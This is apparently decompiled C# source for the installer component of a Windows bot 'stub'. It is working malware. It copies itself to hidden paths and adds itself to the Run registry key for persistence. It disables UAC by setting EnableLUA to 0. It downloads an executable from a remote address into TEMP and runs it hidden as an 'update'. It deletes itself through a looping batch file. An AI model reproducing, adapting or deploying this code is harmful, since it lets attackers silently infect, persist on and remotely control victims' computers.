using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

namespace Stub;

internal class cSystem
{
	private Mutex zMutex;

	public void loadSystem()
	{
		createMutex();
		DisableProcedures();
		InstallBot();
	}

	private void createMutex()
	{
		try
		{
			zMutex = new Mutex(initiallyOwned: true, cMain.ConfigClass.sMutex);
			zMutex.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(-1);
		}
	}

	private void InstallBot()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (checkInstall())
		{
			return;
		}
		try
		{
			string[] sFilePath = cMain.ConfigClass.sFilePath;
			foreach (string text in sFilePath)
			{
				if (!cMain.FunctionClass.checkFile(text))
				{
					File.Copy(fileName, text);
				}
				File.SetAttributes(text, FileAttributes.Hidden);
			}
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
		}
		catch
		{
		}
		try
		{
			zMutex.Close();
			string[] sFilePath2 = cMain.ConfigClass.sFilePath;
			foreach (string fileName2 in sFilePath2)
			{
				Process process = new Process();
				process.StartInfo.FileName = fileName2;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch
		{
		}
		Environment.Exit(-1);
	}

	public void updateBot(string sFileAddress)
	{
		try
		{
			zMutex.Close();
		}
		catch
		{
		}
		try
		{
			string text = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
			new WebClient().DownloadFile(sFileAddress, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
		SelfDestruct();
		Environment.Exit(-1);
	}

	public void RemoveBot()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(cMain.ConfigClass.sRegName[0]);
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(cMain.ConfigClass.sRegName[1]);
		}
		catch
		{
		}
		try
		{
			string[] sFilePath = cMain.ConfigClass.sFilePath;
			foreach (string path in sFilePath)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		SelfDestruct();
		Environment.Exit(-1);
	}

	private bool checkInstall()
	{
		string[] sFilePath = cMain.ConfigClass.sFilePath;
		int num = 0;
		if (0 < sFilePath.Length)
		{
			string filePath = sFilePath[num];
			if (!cMain.FunctionClass.checkFile(filePath))
			{
				return false;
			}
		}
		return true;
	}

	private void SelfDestruct()
	{
		try
		{
			string value = ":RP\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + '"' + " goto RP";
			TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
	}

	private void DisableProcedures()
	{
		if (cMain.ConfigClass.bDisableUAC)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
	}
}
